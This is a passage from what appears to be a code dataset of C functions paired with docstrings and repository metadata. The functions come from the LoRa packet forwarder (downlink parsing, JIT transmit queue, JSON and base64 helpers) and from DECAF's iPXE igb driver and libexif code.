DR_LORA_SF8;  break;\n                    case  9: txpkt.datarate = DR_LORA_SF9;  break;\n                    case 10: txpkt.datarate = DR_LORA_SF10; break;\n                    case 11: txpkt.datarate = DR_LORA_SF11; break;\n                    case 12: txpkt.datarate = DR_LORA_SF12; break;\n                    default:\n                        MSG(\"WARNING: [down] format error in \\\"txpk.datr\\\", invalid SF, TX aborted\\n\");\n                        json_value_free(root_val);\n                        continue;\n                }\n                switch (x1) {\n                    case 125: txpkt.bandwidth = BW_125KHZ; break;\n                    case 250: txpkt.bandwidth = BW_250KHZ; break;\n                    case 500: txpkt.bandwidth = BW_500KHZ; break;\n                    default:\n                        MSG(\"WARNING: [down] format error in \\\"txpk.datr\\\", invalid BW, TX aborted\\n\");\n                        json_value_free(root_val);\n                        continue;\n                }\n\n                /* Parse ECC coding rate (optional field) */\n                str = json_object_get_string(txpk_obj, \"codr\");\n                if (str == NULL) {\n                    MSG(\"WARNING: [down] no mandatory \\\"txpk.codr\\\" object in json, TX aborted\\n\");\n                    json_value_free(root_val);\n                    continue;\n                }\n                if      (strcmp(str, \"4/5\") == 0) txpkt.coderate = CR_LORA_4_5;\n                else if (strcmp(str, \"4/6\") == 0) txpkt.coderate = CR_LORA_4_6;\n                else if (strcmp(str, \"2/3\") == 0) txpkt.coderate = CR_LORA_4_6;\n                else if (strcmp(str, \"4/7\") == 0) txpkt.coderate = CR_LORA_4_7;\n                else if (strcmp(str, \"4/8\") == 0) txpkt.coderate = CR_LORA_4_8;\n                else if (strcmp(str, \"1/2\") == 0) txpkt.coderate = CR_LORA_4_8;\n                else {\n                    MSG(\"WARNING: [down] format error in \\\"txpk.codr\\\", TX aborted\\n\");\n                    json_value_free(root_val);\n                    continue;\n                }\n\n                /* Parse signal polarity switch (optional field) */\n                val = json_object_get_value(txpk_obj,\"ipol\");\n                if (val != NULL) {\n                    txpkt.invert_pol = (bool)json_value_get_boolean(val);\n                }\n\n                /* parse Lora preamble length (optional field, optimum min value enforced) */\n                val = json_object_get_value(txpk_obj,\"prea\");\n                if (val != NULL) {\n                    i = (int)json_value_get_number(val);\n                    if (i >= MIN_LORA_PREAMB) {\n                        txpkt.preamble = (uint16_t)i;\n                    } else {\n                        txpkt.preamble = (uint16_t)MIN_LORA_PREAMB;\n                    }\n                } else {\n                    txpkt.preamble = (uint16_t)STD_LORA_PREAMB;\n                }\n\n            } else if (strcmp(str, \"FSK\") == 0) {\n                /* FSK modulation */\n                txpkt.modulation = MOD_FSK;\n\n                /* parse FSK bitrate (mandatory) */\n                val = json_object_get_value(txpk_obj,\"datr\");\n                if (val == NULL) {\n                    MSG(\"WARNING: [down] no mandatory \\\"txpk.datr\\\" object in JSON, TX aborted\\n\");\n                    json_value_free(root_val);\n                    continue;\n                }\n                txpkt.datarate = (uint32_t)(json_value_get_number(val));\n\n                /* parse frequency deviation (mandatory) */\n                val = json_object_get_value(txpk_obj,\"fdev\");\n                if (val == NULL) {\n                    MSG(\"WARNING: [down] no mandatory \\\"txpk.fdev\\\" object in JSON, TX aborted\\n\");\n                    json_value_free(root_val);\n                    continue;\n                }\n                txpkt.f_dev = (uint8_t)(json_value_get_number(val) / 1000.0); /* JSON value in Hz, txpkt.f_dev in kHz */\n\n                /* parse FSK preamble length (optional field, optimum min value enforced) */\n                val = json_object_get_value(txpk_obj,\"prea\");\n                if (val != NULL) {\n                    i = (int)json_value_get_number(val);\n                    if (i >= MIN_FSK_PREAMB) {\n                        txpkt.preamble = (uint16_t)i;\n                    } else {\n                        txpkt.preamble = (uint16_t)MIN_FSK_PREAMB;\n                    }\n                } else {\n                    txpkt.preamble = (uint16_t)STD_FSK_PREAMB;\n                }\n\n            } else {\n                MSG(\"WARNING: [down] invalid modulation in \\\"txpk.modu\\\", TX aborted\\n\");\n                json_value_free(root_val);\n                continue;\n            }\n\n            /* Parse payload length (mandatory) */\n            val = json_object_get_value(txpk_obj,\"size\");\n            if (val == NULL) {\n                MSG(\"WARNING: [down] no mandatory \\\"txpk.size\\\" object in JSON, TX aborted\\n\");\n                json_value_free(root_val);\n                continue;\n            }\n            txpkt.size = (uint16_t)json_value_get_number(val);\n\n            /* Parse payload data (mandatory) */\n            str = json_object_get_string(txpk_obj, \"data\");\n            if (str == NULL) {\n                MSG(\"WARNING: [down] no mandatory \\\"txpk.data\\\" object in JSON, TX aborted\\n\");\n                json_value_free(root_val);\n                continue;\n            }\n            i = b64_to_bin(str, strlen(str), txpkt.payload, sizeof txpkt.payload);\n            if (i != txpkt.size) {\n                MSG(\"WARNING: [down] mismatch between .size and .data size once converter to binary\\n\");\n            }\n\n            /* free the JSON parse tree from memory */\n            json_value_free(root_val);\n\n            /* select TX mode */\n            if (sent_immediate) {\n                txpkt.tx_mode = IMMEDIATE;\n            } else {\n                txpkt.tx_mode = TIMESTAMPED;\n            }\n\n            /* record measurement data */\n            pthread_mutex_lock(&mx_meas_dw);\n            meas_dw_dgram_rcv += 1; /* count only datagrams with no JSON errors */\n            meas_dw_network_byte += msg_len; /* meas_dw_network_byte */\n            meas_dw_payload_byte += txpkt.size;\n            pthread_mutex_unlock(&mx_meas_dw);\n\n            /* check TX parameter before trying to queue packet */\n            jit_result = JIT_ERROR_OK;\n            if ((txpkt.freq_hz < tx_freq_min[txpkt.rf_chain]) || (txpkt.freq_hz > tx_freq_max[txpkt.rf_chain])) {\n                jit_result = JIT_ERROR_TX_FREQ;\n                MSG(\"ERROR: Packet REJECTED, unsupported frequency - %u (min:%u,max:%u)\\n\", txpkt.freq_hz, tx_freq_min[txpkt.rf_chain], tx_freq_max[txpkt.rf_chain]);\n            }\n            if (jit_result == JIT_ERROR_OK) {\n                for (i=0; i<txlut.size; i++) {\n                    if (txlut.lut[i].rf_power == txpkt.rf_power) {\n                        /* this RF power is supported, we can continue */\n                        break;\n                    }\n                }\n                if (i == txlut.size) {\n                    /* this RF power is not supported */\n                    jit_result = JIT_ERROR_TX_POWER;\n                    MSG(\"ERROR: Packet REJECTED, unsupported RF power for TX - %d\\n\", txpkt.rf_power);\n                }\n            }\n\n            /* insert packet to be sent into JIT queue */\n            if (jit_result == JIT_ERROR_OK) {\n                gettimeofday(&current_unix_time, NULL);\n                get_concentrator_time(&current_concentrator_time, current_unix_time);\n                jit_result = jit_enqueue(&jit_queue, &current_concentrator_time, &txpkt, downlink_type);\n                if (jit_result != JIT_ERROR_OK) {\n                    printf(\"ERROR: Packet REJECTED (jit error=%d)\\n\", jit_result);\n                }\n                pthread_mutex_lock(&mx_meas_dw);\n                meas_nb_tx_requested += 1;\n                pthread_mutex_unlock(&mx_meas_dw);\n            }\n\n            /* Send acknoledge datagram to server */\n            send_tx_ack(buff_down[1], buff_down[2], jit_result);\n        }\n    }\n    MSG(\"\\nINFO: End of downstream thread\\n\");\n}", "path": "packet_forwarder/lora_pkt_fwd/src/lora_pkt_fwd.c", "commit_date": "2017-04-05 00:00:00", "repo_name": "Lora-net/packet_forwarder", "stars": 697, "license": "other", "language": "c", "size": 756}
{"docstring": "/* -------------------------------------------------------------------------- */\n/* --- THREAD 5: CHECK TIME REFERENCE AND CALCULATE XTAL CORRECTION --------- */\n", "func_signal": "void thread_valid(void)", "code": "{\n\n    /* GPS reference validation variables */\n    long gps_ref_age = 0;\n    bool ref_valid_local = false;\n    double xtal_err_cpy;\n\n    /* variables for XTAL correction averaging */\n    unsigned init_cpt = 0;\n    double init_acc = 0.0;\n    double x;\n\n    /* correction debug */\n    // FILE * log_file = NULL;\n    // time_t now_time;\n    // char log_name[64];\n\n    /* initialization */\n    // time(&now_time);\n    // strftime(log_name,sizeof log_name,\"xtal_err_%Y%m%dT%H%M%SZ.csv\",localtime(&now_time));\n    // log_file = fopen(log_name, \"w\");\n    // setbuf(log_file, NULL);\n    // fprintf(log_file,\"\\\"xtal_correct\\\",\\\"XERR_INIT_AVG %u XERR_FILT_COEF %u\\\"\\n\", XERR_INIT_AVG, XERR_FILT_COEF); // DEBUG\n\n    /* main loop task */\n    while (!exit_sig && !quit_sig) {\n        wait_ms(1000);\n\n        /* calculate when the time reference was last updated */\n        pthread_mutex_lock(&mx_timeref);\n        gps_ref_age = (long)difftime(time(NULL), time_reference_gps.systime);\n        if ((gps_ref_age >= 0) && (gps_ref_age <= GPS_REF_MAX_AGE)) {\n            /* time ref is ok, validate and  */\n            gps_ref_valid = true;\n            ref_valid_local = true;\n            xtal_err_cpy = time_reference_gps.xtal_err;\n            //printf(\"XTAL err: %.15lf (1/XTAL_err:%.15lf)\\n\", xtal_err_cpy, 1/xtal_err_cpy); // DEBUG\n        } else {\n            /* time ref is too old, invalidate */\n            gps_ref_valid = false;\n            ref_valid_local = false;\n        }\n        pthread_mutex_unlock(&mx_timeref);\n\n        /* manage XTAL correction */\n        if (ref_valid_local == false) {\n            /* couldn't sync, or sync too old -> invalidate XTAL correction */\n            pthread_mutex_lock(&mx_xcorr);\n            xtal_correct_ok = false;\n            xtal_correct = 1.0;\n            pthread_mutex_unlock(&mx_xcorr);\n            init_cpt = 0;\n            init_acc = 0.0;\n        } else {\n            if (init_cpt < XERR_INIT_AVG) {\n                /* initial accumulation */\n                init_acc += xtal_err_cpy;\n                ++init_cpt;\n            } else if (init_cpt == XERR_INIT_AVG) {\n                /* initial average calculation */\n                pthread_mutex_lock(&mx_xcorr);\n                xtal_correct = (double)(XERR_INIT_AVG) / init_acc;\n                //printf(\"XERR_INIT_AVG=%d, init_acc=%.15lf\\n\", XERR_INIT_AVG, init_acc);\n                xtal_correct_ok = true;\n                pthread_mutex_unlock(&mx_xcorr);\n                ++init_cpt;\n                // fprintf(log_file,\"%.18lf,\\\"average\\\"\\n\", xtal_correct); // DEBUG\n            } else {\n                /* tracking with low-pass filter */\n                x = 1 / xtal_err_cpy;\n                pthread_mutex_lock(&mx_xcorr);\n                xtal_correct = xtal_correct - xtal_correct/XERR_FILT_COEF + x/XERR_FILT_COEF;\n                pthread_mutex_unlock(&mx_xcorr);\n                // fprintf(log_file,\"%.18lf,\\\"track\\\"\\n\", xtal_correct); // DEBUG\n            }\n        }\n        // printf(\"Time ref: %s, XTAL correct: %s (%.15lf)\\n\", ref_valid_local?\"valid\":\"invalid\", xtal_correct_ok?\"valid\":\"invalid\", xtal_correct); // DEBUG\n    }\n    MSG(\"\\nINFO: End of validation thread\\n\");\n}", "path": "packet_forwarder/lora_pkt_fwd/src/lora_pkt_fwd.c", "commit_date": "2017-04-05 00:00:00", "repo_name": "Lora-net/packet_forwarder", "stars": 697, "license": "other", "language": "c", "size": 756}
{"docstring": "/* Parser API */\n", "func_signal": "JSON_Value * json_parse_file(const char *filename)", "code": "{\n    char *file_contents = read_file(filename);\n    JSON_Value *output_value = NULL;\n    if (file_contents == NULL)\n        return NULL;\n    output_value = json_parse_string(file_contents);\n    parson_free(file_contents);\n    return output_value;\n}", "path": "packet_forwarder/lora_pkt_fwd/src/parson.c", "commit_date": "2016-11-09 00:00:00", "repo_name": "Lora-net/packet_forwarder", "stars": 697, "license": "other", "language": "c", "size": 756}
{"docstring": "/* Copies and processes passed string up to supplied length.\nExample: \"\\u006Corem ipsum\" -> lorem ipsum */\n", "func_signal": "static char* process_string(const char *input, size_t len)", "code": "{\n    const char *input_ptr = input;\n    size_t initial_size = (len + 1) * sizeof(char);\n    size_t final_size = 0;\n    char *output = (char*)parson_malloc(initial_size);\n    char *output_ptr = output;\n    char *resized_output = NULL;\n    while ((*input_ptr != '\\0') && (size_t)(input_ptr - input) < len) {\n        if (*input_ptr == '\\\\') {\n            input_ptr++;\n            switch (*input_ptr) {\n                case '\\\"': *output_ptr = '\\\"'; break;\n                case '\\\\': *output_ptr = '\\\\'; break;\n                case '/':  *output_ptr = '/';  break;\n                case 'b':  *output_ptr = '\\b'; break;\n                case 'f':  *output_ptr = '\\f'; break;\n                case 'n':  *output_ptr = '\\n'; break;\n                case 'r':  *output_ptr = '\\r'; break;\n                case 't':  *output_ptr = '\\t'; break;\n                case 'u':\n                    if (parse_utf_16(&input_ptr, &output_ptr) == JSONFailure)\n                        goto error;\n                    break;\n                default:\n                    goto error;\n            }\n        } else if ((unsigned char)*input_ptr < 0x20) {\n            goto error; /* 0x00-0x19 are invalid characters for json string (http://www.ietf.org/rfc/rfc4627.txt) */\n        } else {\n            *output_ptr = *input_ptr;\n        }\n        output_ptr++;\n        input_ptr++;\n    }\n    *output_ptr = '\\0';\n    /* resize to new length */\n    final_size = (size_t)(output_ptr-output) + 1;\n    resized_output = (char*)parson_malloc(final_size);\n    if (resized_output == NULL)\n        goto error;\n    memcpy(resized_output, output, final_size);\n    parson_free(output);\n    return resized_output;\nerror:\n    parson_free(output);\n    return NULL;\n}", "path": "packet_forwarder/lora_pkt_fwd/src/parson.c", "commit_date": "2016-11-09 00:00:00", "repo_name": "Lora-net/packet_forwarder", "stars": 697, "license": "other", "language": "c", "size": 756}
{"docstring": "/* -------------------------------------------------------------------------- */\n/* --- THREAD 3: CHECKING PACKETS TO BE SENT FROM JIT QUEUE AND SEND THEM --- */\n", "func_signal": "void thread_jit(void)", "code": "{\n    int result = LGW_HAL_SUCCESS;\n    struct lgw_pkt_tx_s pkt;\n    int pkt_index = -1;\n    struct timeval current_unix_time;\n    struct timeval current_concentrator_time;\n    enum jit_error_e jit_result;\n    enum jit_pkt_type_e pkt_type;\n    uint8_t tx_status;\n\n    while (!exit_sig && !quit_sig) {\n        wait_ms(10);\n\n        /* transfer data and metadata to the concentrator, and schedule TX */\n        gettimeofday(&current_unix_time, NULL);\n        get_concentrator_time(&current_concentrator_time, current_unix_time);\n        jit_result = jit_peek(&jit_queue, &current_concentrator_time, &pkt_index);\n        if (jit_result == JIT_ERROR_OK) {\n            if (pkt_index > -1) {\n                jit_result = jit_dequeue(&jit_queue, pkt_index, &pkt, &pkt_type);\n                if (jit_result == JIT_ERROR_OK) {\n                    /* update beacon stats */\n                    if (pkt_type == JIT_PKT_TYPE_BEACON) {\n                        /* Compensate breacon frequency with xtal error */\n                        pthread_mutex_lock(&mx_xcorr);\n                        pkt.freq_hz = (uint32_t)(xtal_correct * (double)pkt.freq_hz);\n                        MSG_DEBUG(DEBUG_BEACON, \"beacon_pkt.freq_hz=%u (xtal_correct=%.15lf)\\n\", pkt.freq_hz, xtal_correct);\n                        pthread_mutex_unlock(&mx_xcorr);\n\n                        /* Update statistics */\n                        pthread_mutex_lock(&mx_meas_dw);\n                        meas_nb_beacon_sent += 1;\n                        pthread_mutex_unlock(&mx_meas_dw);\n                        MSG(\"INFO: Beacon dequeued (count_us=%u)\\n\", pkt.count_us);\n                    }\n\n                    /* check if concentrator is free for sending new packet */\n                    pthread_mutex_lock(&mx_concent); /* may have to wait for a fetch to finish */\n                    result = lgw_status(TX_STATUS, &tx_status);\n                    pthread_mutex_unlock(&mx_concent); /* free concentrator ASAP */\n                    if (result == LGW_HAL_ERROR) {\n                        MSG(\"WARNING: [jit] lgw_status failed\\n\");\n                    } else {\n                        if (tx_status == TX_EMITTING) {\n                            MSG(\"ERROR: concentrator is currently emitting\\n\");\n                            print_tx_status(tx_status);\n                            continue;\n                        } else if (tx_status == TX_SCHEDULED) {\n                            MSG(\"WARNING: a downlink was already scheduled, overwritting it...\\n\");\n                            print_tx_status(tx_status);\n                        } else {\n                            /* Nothing to do */\n                        }\n                    }\n\n                    /* send packet to concentrator */\n                    pthread_mutex_lock(&mx_concent); /* may have to wait for a fetch to finish */\n                    result = lgw_send(pkt);\n                    pthread_mutex_unlock(&mx_concent); /* free concentrator ASAP */\n                    if (result == LGW_HAL_ERROR) {\n                        pthread_mutex_lock(&mx_meas_dw);\n                        meas_nb_tx_fail += 1;\n                        pthread_mutex_unlock(&mx_meas_dw);\n                        MSG(\"WARNING: [jit] lgw_send failed\\n\");\n                        continue;\n                    } else {\n                        pthread_mutex_lock(&mx_meas_dw);\n                        meas_nb_tx_ok += 1;\n                        pthread_mutex_unlock(&mx_meas_dw);\n                        MSG_DEBUG(DEBUG_PKT_FWD, \"lgw_send done: count_us=%u\\n\", pkt.count_us);\n                    }\n                } else {\n                    MSG(\"ERROR: jit_dequeue failed with %d\\n\", jit_result);\n                }\n            }\n        } else if (jit_result == JIT_ERROR_EMPTY) {\n            /* Do nothing, it can happen */\n        } else {\n            MSG(\"ERROR: jit_peek failed with %d\\n\", jit_result);\n        }\n    }\n}", "path": "packet_forwarder/lora_pkt_fwd/src/lora_pkt_fwd.c", "commit_date": "2017-04-05 00:00:00", "repo_name": "Lora-net/packet_forwarder", "stars": 697, "license": "other", "language": "c", "size": 756}
{"docstring": "/* JSON Object API */\n", "func_signal": "JSON_Value * json_object_get_value(const JSON_Object *object, const char *name)", "code": "{\n    if (object == NULL || name == NULL)\n        return NULL;\n    return json_object_nget_value(object, name, strlen(name));\n}", "path": "packet_forwarder/lora_pkt_fwd/src/parson.c", "commit_date": "2016-11-09 00:00:00", "repo_name": "Lora-net/packet_forwarder", "stars": 697, "license": "other", "language": "c", "size": 756}
{"docstring": "/* -------------------------------------------------------------------------- */\n/* --- PUBLIC FUNCTIONS DEFINITION ----------------------------------------- */\n", "func_signal": "bool jit_queue_is_full(struct jit_queue_s *queue)", "code": "{\n    bool result;\n\n    pthread_mutex_lock(&mx_jit_queue);\n\n    result = (queue->num_pkt == JIT_QUEUE_MAX)?true:false;\n\n    pthread_mutex_unlock(&mx_jit_queue);\n\n    return result;\n}", "path": "packet_forwarder/lora_pkt_fwd/src/jitqueue.c", "commit_date": "2016-11-09 00:00:00", "repo_name": "Lora-net/packet_forwarder", "stars": 697, "license": "other", "language": "c", "size": 756}
{"docstring": "/* Parser */\n", "func_signal": "static void skip_quotes(const char **string)", "code": "{\n    SKIP_CHAR(string);\n    while (**string != '\\\"') {\n        if (**string == '\\0')\n            return;\n        if (**string == '\\\\') {\n            SKIP_CHAR(string);\n            if (**string == '\\0')\n                return;\n        }\n        SKIP_CHAR(string);\n    }\n    SKIP_CHAR(string);\n}", "path": "packet_forwarder/lora_pkt_fwd/src/parson.c", "commit_date": "2016-11-09 00:00:00", "repo_name": "Lora-net/packet_forwarder", "stars": 697, "license": "other", "language": "c", "size": 756}
{"docstring": "/* -------------------------------------------------------------------------- */\n/* --- PUBLIC FUNCTIONS DEFINITION ------------------------------------------ */\n", "func_signal": "int bin_to_b64_nopad(const uint8_t * in, int size, char * out, int max_len)", "code": "{\n    int i;\n    int result_len; /* size of the result */\n    int full_blocks; /* number of 3 unsigned chars / 4 characters blocks */\n    int last_bytes; /* number of unsigned chars <3 in the last block */\n    int last_chars; /* number of characters <4 in the last block */\n    uint32_t b;\n\n    /* check input values */\n    if ((out == NULL) || (in == NULL)) {\n        DEBUG(\"ERROR: NULL POINTER AS OUTPUT IN BIN_TO_B64\\n\");\n        return -1;\n    }\n    if (size == 0) {\n        *out = 0; /* null string */\n        return 0;\n    }\n\n    /* calculate the number of base64 'blocks' */\n    full_blocks = size / 3;\n    last_bytes = size % 3;\n    switch (last_bytes) {\n        case 0: /* no byte left to encode */\n            last_chars = 0;\n            break;\n        case 1: /* 1 byte left to encode -> +2 chars */\n            last_chars = 2;\n            break;\n        case 2: /* 2 bytes left to encode -> +3 chars */\n            last_chars = 3;\n            break;\n        default:\n            CRIT(\"switch default that should not be possible\");\n    }\n\n    /* check if output buffer is big enough */\n    result_len = (4*full_blocks) + last_chars;\n    if (max_len < (result_len + 1)) { /* 1 char added for string terminator */\n        DEBUG(\"ERROR: OUTPUT BUFFER TOO SMALL IN BIN_TO_B64\\n\");\n        return -1;\n    }\n\n    /* process all the full blocks */\n    for (i=0; i < full_blocks; ++i) {\n        b  = (0xFF & in[3*i]    ) << 16;\n        b |= (0xFF & in[3*i + 1]) << 8;\n        b |=  0xFF & in[3*i + 2];\n        out[4*i + 0] = code_to_char((b >> 18) & 0x3F);\n        out[4*i + 1] = code_to_char((b >> 12) & 0x3F);\n        out[4*i + 2] = code_to_char((b >> 6 ) & 0x3F);\n        out[4*i + 3] = code_to_char( b        & 0x3F);\n    }\n\n    /* process the last 'partial' block and terminate string */\n    i = full_blocks;\n    if (last_chars == 0) {\n        out[4*i] =  0; /* null character to terminate string */\n    } else if (last_chars == 2) {\n        b  = (0xFF & in[3*i]    ) << 16;\n        out[4*i + 0] = code_to_char((b >> 18) & 0x3F);\n        out[4*i + 1] = code_to_char((b >> 12) & 0x3F);\n        out[4*i + 2] =  0; /* null character to terminate string */\n    } else if (last_chars == 3) {\n        b  = (0xFF & in[3*i]    ) << 16;\n        b |= (0xFF & in[3*i + 1]) << 8;\n        out[4*i + 0] = code_to_char((b >> 18) & 0x3F);\n        out[4*i + 1] = code_to_char((b >> 12) & 0x3F);\n        out[4*i + 2] = code_to_char((b >> 6 ) & 0x3F);\n        out[4*i + 3] = 0; /* null character to terminate string */\n    }\n\n    return result_len;\n}", "path": "packet_forwarder/util_tx_test/src/base64.c", "commit_date": "2016-06-06 00:00:00", "repo_name": "Lora-net/packet_forwarder", "stars": 697, "license": "other", "language": "c", "size": 756}
{"docstring": "/* JSON Object */\n", "func_signal": "static JSON_Object * json_object_init(void)", "code": "{\n    JSON_Object *new_obj = (JSON_Object*)parson_malloc(sizeof(JSON_Object));\n    if (!new_obj)\n        return NULL;\n    new_obj->names = (char**)NULL;\n    new_obj->values = (JSON_Value**)NULL;\n    new_obj->capacity = 0;\n    new_obj->count = 0;\n    return new_obj;\n}", "path": "packet_forwarder/lora_pkt_fwd/src/parson.c", "commit_date": "2016-11-09 00:00:00", "repo_name": "Lora-net/packet_forwarder", "stars": 697, "license": "other", "language": "c", "size": 756}
{"docstring": "/* -------------------------------------------------------------------------- */\n/* --- PRIVATE FUNCTIONS DEFINITION ----------------------------------------- */\n", "func_signal": "char code_to_char(uint8_t x)", "code": "{\n    if (x <= 25) {\n        return 'A' + x;\n    } else if ((x >= 26) && (x <= 51)) {\n        return 'a' + (x-26);\n    } else if ((x >= 52) && (x <= 61)) {\n        return '0' + (x-52);\n    } else if (x == 62) {\n        return code_62;\n    } else if (x == 63) {\n        return code_63;\n    } else {\n        DEBUG(\"ERROR: %i IS OUT OF RANGE 0-63 FOR BASE64 ENCODING\\n\", x);\n        exit(EXIT_FAILURE);\n    } //TODO: improve error management\n}", "path": "packet_forwarder/util_tx_test/src/base64.c", "commit_date": "2016-06-06 00:00:00", "repo_name": "Lora-net/packet_forwarder", "stars": 697, "license": "other", "language": "c", "size": 756}
{"docstring": "/**\n * igb_open - Called when a network interface is made active\n *\n * @v netdev\tnetwork interface device structure\n * @ret rc\tReturn status code, 0 on success, negative value on failure\n *\n **/\n", "func_signal": "static int igb_open ( struct net_device *netdev )", "code": "{\n\tstruct igb_adapter *adapter = netdev_priv(netdev);\n\tint err;\n\n\tDBGP ( \"igb_open\\n\" );\n\n\t/* allocate transmit descriptors */\n\terr = igb_setup_tx_resources ( adapter );\n\tif ( err ) {\n\t\tDBG ( \"Error setting up TX resources!\\n\" );\n\t\tgoto err_setup_tx;\n\t}\n\n\t/* allocate receive descriptors */\n\terr = igb_setup_rx_resources ( adapter );\n\tif ( err ) {\n\t\tDBG ( \"Error setting up RX resources!\\n\" );\n\t\tgoto err_setup_rx;\n\t}\n\n\tigb_configure_tx ( adapter );\n\n\tigb_configure_rx ( adapter );\n\n\tDBG ( \"E1000_RXDCTL(0): %#08x\\n\",  E1000_READ_REG ( &adapter->hw, E1000_RXDCTL(0) ) );\n\n\treturn 0;\n\nerr_setup_rx:\n\tDBG ( \"err_setup_rx\\n\" );\n\tigb_free_tx_resources ( adapter );\nerr_setup_tx:\n\tDBG ( \"err_setup_tx\\n\" );\n\tigb_reset ( adapter );\n\n\treturn err;\n}", "path": "DECAF/decaf/roms/ipxe/src/drivers/net/igb/igb_main.c", "commit_date": "2014-12-17 00:00:00", "repo_name": "decaf-project/DECAF", "stars": 765, "license": "gpl-3.0", "language": "c", "size": 78317}
{"docstring": "/**\n * igb_write_pcie_cap_reg - write value to PCIe capability register\n * @hw: address of board private structure\n * @reg: PCIe capability register to write to\n * @value: value to store in given register\n **/\n", "func_signal": "int32_t igb_write_pcie_cap_reg(struct e1000_hw *hw, u32 reg, u16 *value)", "code": "{\n\tstruct igb_adapter *adapter = hw->back;\n\tu16 cap_offset;\n\n\tcap_offset = pci_find_capability(adapter->pdev, PCI_CAP_ID_EXP);\n\tif (!cap_offset)\n\t\treturn -E1000_ERR_CONFIG;\n\n\tpci_write_config_word(adapter->pdev, cap_offset + reg, *value);\n\n\treturn E1000_SUCCESS;\n}", "path": "DECAF/decaf/roms/ipxe/src/drivers/net/igb/igb_main.c", "commit_date": "2014-12-17 00:00:00", "repo_name": "decaf-project/DECAF", "stars": 765, "license": "gpl-3.0", "language": "c", "size": 78317}
{"docstring": "/**\n * igb_remove - Device Removal Routine\n *\n * @v pdev PCI device information struct\n *\n **/\n", "func_signal": "void igb_remove ( struct pci_device *pdev )", "code": "{\n\tstruct net_device *netdev = pci_get_drvdata ( pdev );\n\tstruct igb_adapter *adapter = netdev_priv ( netdev );\n\n\tDBGP ( \"igb_remove\\n\" );\n\n\tif ( adapter->hw.flash_address )\n\t\tiounmap ( adapter->hw.flash_address );\n\tif  ( adapter->hw.hw_addr )\n\t\tiounmap ( adapter->hw.hw_addr );\n\n\tunregister_netdev ( netdev );\n\tigb_reset  ( adapter );\n\tnetdev_nullify ( netdev );\n\tnetdev_put ( netdev );\n}", "path": "DECAF/decaf/roms/ipxe/src/drivers/net/igb/igb_main.c", "commit_date": "2014-12-17 00:00:00", "repo_name": "decaf-project/DECAF", "stars": 765, "license": "gpl-3.0", "language": "c", "size": 78317}
{"docstring": "/*! Get a value and convert it to an ExifShort.\n * \\bug Not all types are converted that could be converted and no indication\n *      is made when that occurs\n */\n", "func_signal": "static inline ExifShort\nexif_get_short_convert (const unsigned char *buf, ExifFormat format,\n\t\t\tExifByteOrder order)", "code": "{\n\tswitch (format) {\n\tcase EXIF_FORMAT_LONG:\n\t\treturn (ExifShort) exif_get_long (buf, order);\n\tcase EXIF_FORMAT_SLONG:\n\t\treturn (ExifShort) exif_get_slong (buf, order);\n\tcase EXIF_FORMAT_SHORT:\n\t\treturn (ExifShort) exif_get_short (buf, order);\n\tcase EXIF_FORMAT_SSHORT:\n\t\treturn (ExifShort) exif_get_sshort (buf, order);\n\tcase EXIF_FORMAT_BYTE:\n\tcase EXIF_FORMAT_SBYTE:\n\t\treturn (ExifShort) buf[0];\n\tdefault:\n\t\t/* Unsupported type */\n\t\treturn (ExifShort) 0;\n\t}\n}", "path": "DECAF/decaf/shared/sleuthkit/framework/modules/c_LibExifModule/libexif-0.6.20/libexif/exif-entry.c", "commit_date": "2015-06-19 00:00:00", "repo_name": "decaf-project/DECAF", "stars": 765, "license": "gpl-3.0", "language": "c", "size": 78317}
{"docstring": "/* RX support routines */\n", "func_signal": "static void igb_free_rx_resources ( struct igb_adapter *adapter )", "code": "{\n\tint i;\n\n\tDBG ( \"igb_free_rx_resources\\n\" );\n\n\tfree_dma ( adapter->rx_base, adapter->rx_ring_size );\n\n\tfor ( i = 0; i < NUM_RX_DESC; i++ ) {\n\t\tfree_iob ( adapter->rx_iobuf[i] );\n\t}\n}", "path": "DECAF/decaf/roms/ipxe/src/drivers/net/igb/igb_main.c", "commit_date": "2014-12-17 00:00:00", "repo_name": "decaf-project/DECAF", "stars": 765, "license": "gpl-3.0", "language": "c", "size": 78317}
{"docstring": "/**\n * igb_irq - enable or Disable interrupts\n *\n * @v adapter\te1000 adapter\n * @v action\trequested interrupt action\n **/\n", "func_signal": "static void igb_irq ( struct net_device *netdev, int enable )", "code": "{\n\tstruct igb_adapter *adapter = netdev_priv ( netdev );\n\n\tDBGP ( \"igb_irq\\n\" );\n\n\tif ( enable ) {\n\t\tigb_irq_enable ( adapter );\n\t} else {\n\t\tigb_irq_disable ( adapter );\n\t}\n}", "path": "DECAF/decaf/roms/ipxe/src/drivers/net/igb/igb_main.c", "commit_date": "2014-12-17 00:00:00", "repo_name": "decaf-project/DECAF", "stars": 765, "license": "gpl-3.0", "language": "c", "size": 78317}
{"docstring": "/*!\n * \\bug Log and report failed exif_mem_malloc() calls.\n */\n", "func_signal": "void\nexif_entry_initialize (ExifEntry *e, ExifTag tag)", "code": "{\n\tExifRational r;\n\tExifByteOrder o;\n\n\t/* We need the byte order */\n\tif (!e || !e->parent || e->data || !e->parent->parent)\n\t\treturn;\n\to = exif_data_get_byte_order (e->parent->parent);\n\n\te->tag = tag;\n\tswitch (tag) {\n\n\t/* LONG, 1 component, no default */\n\tcase EXIF_TAG_PIXEL_X_DIMENSION:\n\tcase EXIF_TAG_PIXEL_Y_DIMENSION:\n\tcase EXIF_TAG_EXIF_IFD_POINTER:\n\tcase EXIF_TAG_GPS_INFO_IFD_POINTER:\n\tcase EXIF_TAG_INTEROPERABILITY_IFD_POINTER:\n\tcase EXIF_TAG_JPEG_INTERCHANGE_FORMAT_LENGTH:\n\tcase EXIF_TAG_JPEG_INTERCHANGE_FORMAT:\n\t\te->components = 1;\n\t\te->format = EXIF_FORMAT_LONG;\n\t\te->size = exif_format_get_size (e->format) * e->components;\n\t\te->data = exif_entry_alloc (e, e->size);\n\t\tif (!e->data) break;\n\t\tbreak;\n\n\t/* SHORT, 1 component, no default */\n\tcase EXIF_TAG_SUBJECT_LOCATION:\n\tcase EXIF_TAG_SENSING_METHOD:\n\tcase EXIF_TAG_PHOTOMETRIC_INTERPRETATION:\n\tcase EXIF_TAG_COMPRESSION:\n\tcase EXIF_TAG_EXPOSURE_MODE:\n\tcase EXIF_TAG_WHITE_BALANCE:\n\tcase EXIF_TAG_FOCAL_LENGTH_IN_35MM_FILM:\n\tcase EXIF_TAG_GAIN_CONTROL:\n\tcase EXIF_TAG_SUBJECT_DISTANCE_RANGE:\n\tcase EXIF_TAG_FLASH:\n\tcase 